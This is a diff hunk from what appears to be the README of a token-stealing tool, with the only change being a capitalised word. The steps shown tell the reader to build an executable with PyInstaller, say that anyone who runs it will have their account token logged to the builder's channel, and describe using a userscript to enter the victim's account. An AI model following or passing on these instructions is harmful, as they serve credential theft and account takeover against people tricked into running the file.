@@ -10,7 +10,7 @@
 
 3 - Run `build.bat` (it will create an executable. IT USES PYINSTALLER. MAKE SURE ITS INSTALLED)
 
-4 - In the /dist/ folder, you can find the exe. people who run it will have their token logged into your channel
+4 - In the /dist/ folder, you can find the exe. People who run it will have their token logged into your channel
 
 5 - Use the userscript `login_userscript.js` to enter his account
 
